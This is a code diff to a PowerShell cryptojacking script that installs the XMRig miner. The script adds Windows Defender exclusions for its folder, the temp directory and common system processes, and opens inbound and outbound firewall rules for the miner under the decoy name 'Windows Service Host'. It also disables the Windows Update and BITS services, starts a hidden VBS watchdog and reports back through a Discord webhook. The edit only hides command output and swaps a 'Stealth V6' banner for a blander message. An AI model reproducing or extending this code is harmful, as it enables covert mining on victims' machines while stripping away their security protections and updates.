@@ -243,13 +243,13 @@ try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
     
     # --- HARDENING ---
-    Add-MpPreference -ExclusionPath "$installDir", "$env:TEMP" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "svchost.exe", "wscript.exe", "powershell.exe" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$installDir", "$env:TEMP" -ErrorAction SilentlyContinue | Out-Null
+    Add-MpPreference -ExclusionProcess "svchost.exe", "wscript.exe", "powershell.exe" -ErrorAction SilentlyContinue | Out-Null
     
     # Firewall Punching
     try {
-        New-NetFirewallRule -DisplayName "Windows Service Host" -Direction Outbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue
-        New-NetFirewallRule -DisplayName "Windows Service Host In" -Direction Inbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue
+        New-NetFirewallRule -DisplayName "Windows Service Host" -Direction Outbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
+        New-NetFirewallRule -DisplayName "Windows Service Host In" -Direction Inbound -Program "$xmrigExe" -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 
     try { & sc.exe config wuauserv start= disabled >$null 2>&1; & sc.exe stop wuauserv >$null 2>&1; & sc.exe config bits start= disabled >$null 2>&1; & sc.exe stop bits >$null 2>&1 } catch {}
@@ -262,5 +262,5 @@ try {
     Start-Process "wscript.exe" -ArgumentList "`"$watchdogVbs`"" -WindowStyle Hidden
     Start-Sleep -Seconds 2
     Send-DiscordWebhook
-    Write-Host "[+] Stealth V6 (Phantom Pro) Live."
-} catch { Write-Host "[-] Error: $_" }
+    Write-Host "[+] deployed successful"
+} catch { Write-Host "[-] deployment failed$_" }
